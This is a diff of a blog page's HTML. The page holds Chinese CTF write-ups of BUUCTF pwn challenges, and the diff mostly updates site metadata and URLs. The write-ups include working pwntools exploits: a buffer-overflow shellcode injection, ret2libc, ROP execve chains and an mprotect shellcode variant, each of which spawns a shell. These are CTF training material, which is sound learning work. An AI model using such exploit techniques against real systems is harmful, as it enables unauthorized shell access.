@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>BUU_PWN刷题_0x30-0x3F - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>BUU_PWN刷题_0x30-0x3F - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="BUU_PWN刷题_0x30-0x3F">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-07-18T00:00:00+00:00" />
+<meta name="description" content="[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF printf(&#34;What&#39;s this:%p?\n&#34;, buf); return read(0, buf, 0x100u); }tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&#39;debug&#39;) io = process(&#34;./level1&#34;) ##io = remote(&#34;node4.buuoj.cn&#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload &#43;=(0x88&#43;4-len(asm(shellcraft.sh())))*&#39;a&#39; &#43; p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive()只能ret2libc了： from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level1&#34;) elf = ELF(&#34;./level1&#34;) libc = ELF(&#34;./libc-2.23.so&#34;) io = remote(&#34;node4.buuoj.cn&#34;,29905) payload =" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="BUU_PWN刷题_0x30-0x3F">
+<meta itemprop="description" content="[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF printf(&#34;What&#39;s this:%p?\n&#34;, buf); return read(0, buf, 0x100u); }tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&#39;debug&#39;) io = process(&#34;./level1&#34;) ##io = remote(&#34;node4.buuoj.cn&#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload &#43;=(0x88&#43;4-len(asm(shellcraft.sh())))*&#39;a&#39; &#43; p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive()只能ret2libc了： from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level1&#34;) elf = ELF(&#34;./level1&#34;) libc = ELF(&#34;./libc-2.23.so&#34;) io = remote(&#34;node4.buuoj.cn&#34;,29905) payload ="><meta itemprop="datePublished" content="2021-07-18T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-07-18T00:00:00+00:00" />
-<meta itemprop="wordCount" content="10305">
+<meta itemprop="wordCount" content="10223">
 <meta itemprop="keywords" content="PWN," /><meta property="og:title" content="BUU_PWN刷题_0x30-0x3F" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF printf(&#34;What&#39;s this:%p?\n&#34;, buf); return read(0, buf, 0x100u); }tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&#39;debug&#39;) io = process(&#34;./level1&#34;) ##io = remote(&#34;node4.buuoj.cn&#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload &#43;=(0x88&#43;4-len(asm(shellcraft.sh())))*&#39;a&#39; &#43; p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive()只能ret2libc了： from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level1&#34;) elf = ELF(&#34;./level1&#34;) libc = ELF(&#34;./libc-2.23.so&#34;) io = remote(&#34;node4.buuoj.cn&#34;,29905) payload =" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/buu-pwn-0x30-0x3f/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-07-18T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-07-18T00:00:00+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUU_PWN刷题_0x30-0x3F"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp&#43;0h] [ebp-88h] BYREF printf(&#34;What&#39;s this:%p?\n&#34;, buf); return read(0, buf, 0x100u); }tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&#39;debug&#39;) io = process(&#34;./level1&#34;) ##io = remote(&#34;node4.buuoj.cn&#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload &#43;=(0x88&#43;4-len(asm(shellcraft.sh())))*&#39;a&#39; &#43; p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive()只能ret2libc了： from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level1&#34;) elf = ELF(&#34;./level1&#34;) libc = ELF(&#34;./libc-2.23.so&#34;) io = remote(&#34;node4.buuoj.cn&#34;,29905) payload ="/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/buu-pwn-0x30-0x3f/" /><link rel="prev" href="http://localhost:1313/posts/buu-pwn-0x20-0x2f/" /><link rel="next" href="http://localhost:1313/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" /><link rel="prev" href="http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/" /><link rel="next" href="http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/buu-pwn-0x30-0x3f\/"
-    },"genre": "posts","keywords": "PWN","wordcount":  10305 ,
-    "url": "http:\/\/localhost:1313\/posts\/buu-pwn-0x30-0x3f\/","datePublished": "2021-07-18T00:00:00+00:00","dateModified": "2021-07-18T00:00:00+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/buu-pwn-0x30-0x3f\/"
+    },"genre": "posts","keywords": "PWN","wordcount":  10223 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/buu-pwn-0x30-0x3f\/","datePublished": "2021-07-18T00:00:00+00:00","dateModified": "2021-07-18T00:00:00+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -124,8 +124,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_PWN刷题_0x30-0x3F</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-07-18 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-07-18">2021-07-18</time></span>&nbsp;<span title="10305 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 10400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 21 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-07-18 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-07-18">2021-07-18</time></span>&nbsp;<span title="10223 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 10300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 21 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -159,15 +158,18 @@
   </ul>
 </nav></div>
       </div><div class="content" id="content"><p>[TOC]</p>
-<h2 id="0x30jarvisoj_level1" class="heading-element">
-  <a href="#0x30jarvisoj_level1" class="heading-mark"></a>0x30.jarvisoj_level1</h2><div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
+<h2 id="0x30jarvisoj_level1" class="heading-element"><span>0x30.jarvisoj_level1</span>
+  <a href="#0x30jarvisoj_level1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-88h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What&#39;s this:%p?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>tmd，这题给的题目和平台的题不太一样，正常这道题的exp：</p>
-<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./level1&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = remote(&#34;node4.buuoj.cn&#34;,29905)</span>
@@ -177,7 +179,7 @@
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>只能ret2libc了：</p>
-<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./level1&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level1&#34;</span><span class="p">)</span>
@@ -191,11 +193,17 @@
 </span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_add</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x31inndy_rop" class="heading-element">
-  <a href="#0x31inndy_rop" class="heading-mark"></a>0x31.inndy_rop</h2><h3 id="解法一rop" class="heading-element">
-  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%80rop" class="heading-mark"></a>解法一：ROP</h3><p>静态编译，可以直接ropgadget找rop链：<code>ROPgadget --binary rop --ropchain</code></p>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x31inndy_rop" class="heading-element"><span>0x31.inndy_rop</span>
+  <a href="#0x31inndy_rop" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="解法一rop" class="heading-element"><span>解法一：ROP</span>
+  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%80rop" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>静态编译，可以直接ropgadget找rop链：<code>ROPgadget --binary rop --ropchain</code></p>
 <p>exp:</p>
-<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./rop&#34;</span><span class="p">)</span>
@@ -237,9 +245,12 @@
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0807a66f</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806c943</span><span class="p">)</span> <span class="c1"># int 0x80</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法二mprotect" class="heading-element">
-  <a href="#%e8%a7%a3%e6%b3%95%e4%ba%8cmprotect" class="heading-mark"></a>解法二：mprotect</h3><p>exp:</p>
-<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法二mprotect" class="heading-element"><span>解法二：mprotect</span>
+  <a href="#%e8%a7%a3%e6%b3%95%e4%ba%8cmprotect" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./rop&#34;)</span>
@@ -257,8 +268,11 @@
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">())</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法三syscall" class="heading-element">
-  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%89syscall" class="heading-mark"></a>解法三：syscall</h3><div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法三syscall" class="heading-element"><span>解法三：syscall</span>
+  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%89syscall" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span> 
 </span></span><span class="line"><span class="cl"><span class="c1">##p = remote(&#39;node3.buuoj.cn&#39;,26508)</span>
 </span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>
@@ -283,8 +297,11 @@
